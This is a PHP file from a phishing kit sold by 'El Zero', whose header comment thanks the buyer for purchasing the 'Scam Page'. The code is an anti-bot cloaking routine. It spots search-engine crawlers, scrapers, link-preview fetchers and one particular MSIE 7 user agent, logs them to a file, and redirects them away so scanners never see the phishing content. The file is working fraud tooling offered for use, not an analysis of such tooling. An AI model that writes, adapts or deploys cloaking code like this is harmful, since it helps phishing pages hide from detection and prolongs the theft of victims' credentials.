<?php

/*
▓█████ ██▓       ▒███████▓█████ ██▀███  ▒█████  
▓█   ▀▓██▒       ▒ ▒ ▒ ▄▀▓█   ▀▓██ ▒ ██▒██▒  ██▒
▒███  ▒██░       ░ ▒ ▄▀▒░▒███  ▓██ ░▄█ ▒██░  ██▒
▒▓█  ▄▒██░         ▄▀▒   ▒▓█  ▄▒██▀▀█▄ ▒██   ██░
░▒████░██████▒   ▒███████░▒████░██▓ ▒██░ ████▓▒░
░░ ▒░ ░ ▒░▓  ░   ░▒▒ ▓░▒░░░ ▒░ ░ ▒▓ ░▒▓░ ▒░▒░▒░ 
 ░ ░  ░ ░ ▒  ░   ░░▒ ▒ ░ ▒░ ░  ░ ░▒ ░ ▒░ ░ ▒ ▒░ 
   ░    ░ ░      ░ ░ ░ ░ ░  ░    ░░   ░░ ░ ░ ▒  
   ░  ░   ░  ░     ░ ░      ░  ░  ░        ░ ░  
                 ░                              
icq =>  @ElZero
telegram => @ElZeroCoder
Thanks For Buying My Scam Page
Copyright all Reserved to El Zero
*/

if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Java') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')  
		or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') 
		or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) {
			$content = "El Zero AntiBots =>".$_SERVER['HTTP_USER_AGENT']." [ SomeBots ] \r\n";
		    $save=fopen("priv/bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("Location: ".redirectBot());exit();
	}
	if ($_SERVER['HTTP_USER_AGENT'] == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
			$content = "El Zero AntiBots => ".$_SERVER['HTTP_USER_AGENT']." [ SomeBots ] \r\n";
		    $save=fopen("priv/bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("Location: ".redirectBot());exit();


	}

?>